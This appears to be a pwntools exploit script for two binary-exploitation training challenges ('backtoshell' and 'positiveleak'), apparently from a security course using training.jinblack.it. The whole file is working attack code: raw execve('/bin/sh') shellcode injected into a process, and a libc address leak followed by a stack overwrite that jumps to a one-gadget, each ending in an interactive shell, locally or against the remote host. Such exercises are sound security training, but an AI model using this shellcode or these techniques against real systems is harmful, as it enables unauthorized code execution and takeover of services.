import argparse
from pwn import *
import claripy
import angr

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ["exo-open", "--launch", "TerminalEmulator"]


class switcher:
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def backtoshell(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 3001)
        else:
            r = process("./" + args.binary)
            gdb.attach(
                r,
                """
            c
            """,
            )
            input("Press any key to continue.")

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        shellcode = b"\x48\x89\xC4\x48\x81\xC4\x00\x01\x00\x00\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
        shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        payload = shellcode

        r.send(payload)
        r.interactive()

    @classmethod
    def positiveleak(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 3003)
        else:
            r = process("./" + args.binary, env={"LD_PRELOAD": "./libc-2.27.so"})
            gdb.attach(
                r,
                """
            b *add_numbers+405
            c
            """,
            )
            input("Press any key to continue.")

        def assembly(num):
            # mov    eax,DWORD PTR [rbp-0x1c]
            eax = [int(x) for x in bin(num)[2:]]
            # cdqe
            rax = []
            for _ in range(16 - len(eax)):
                rax.append(0)
            for i in eax:
                rax.append(i)
            # shl    rax,0x2
            rax = rax[2:]
            rax.append(0)
            rax.append(0)
            # lea    rdx,[rax+0x8]
            rdx = int("".join(str(i) for i in rax), 2) + 0x8
            # mov    eax,0x10
            eax = int(0x10)
            # sub    rax,0x1
            rax = eax - 1
            # add    rax,rdx
            rax += rdx
            # div rsi
            rax = int(rax / 0x10)
            # imul   rax,rax,0x10
            rax *= 0x10

            return rax

        leak_pos = 4

        r.recvuntil("> ")
        r.sendline(b"0")
        r.recvuntil("> ")
        r.sendline(b"%d" % leak_pos)
        r.recvuntil("> ")
        r.sendline(b"0")

        for _ in range(0, leak_pos):
            r.recvuntil("> ")
            r.sendline(b"0")

        r.recvuntil("> ")
        r.sendline(b"1")

        for _ in range(0, leak_pos):
            r.recvuntil("0\n")

        leak = int(r.recvuntil("\n")[:-1])
        gadget_addr = leak - 0x3EC680 + 0x4F322
        print("[!] leak: %s" % hex(leak))
        print("[!] gadget_addr: %s" % hex(gadget_addr))

        stack_num = 50
        stack_dist = int(assembly(stack_num) / 8) + 1

        r.recvuntil("> ")
        r.sendline(b"0")
        r.recvuntil("> ")
        r.sendline(b"%d" % stack_num)

        for i in range(0, stack_dist):
            r.recvuntil("> ")
            r.sendline(b"0")

        counter = int(hex(stack_dist + 5) + "00000000", 16)

        r.recvuntil("> ")
        r.sendline(b"%d" % counter)

        r.recvuntil("> ")
        r.sendline(b"%d" % gadget_addr)

        for i in range(0, 9):
            r.recvuntil("> ")
            r.sendline(b"0")

        r.recvuntil("> ")
        r.sendline(b"-1")

        r.interactive()


switcher.indirect(parser.parse_args())
